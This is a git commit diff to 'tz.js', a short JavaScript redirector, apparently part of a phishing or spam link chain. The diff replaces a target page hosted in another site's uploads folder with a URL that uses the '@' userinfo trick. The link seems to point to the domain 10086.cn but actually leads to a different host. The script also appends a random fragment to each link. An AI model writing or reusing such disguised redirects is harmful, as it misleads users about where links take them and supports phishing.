43028ae494fe10fe9ab3f61be720f7f268d2c1a1
xcz789 <2644987@qq.com>
2024-06-14 17:17:40 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://www.lxgeopark.com/Public/uploads/file/20240609/20240609203755_64229.html";
+let redirectURL = "http://10086.cn@static.yage.org.cn/home/1218356301415.htm";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
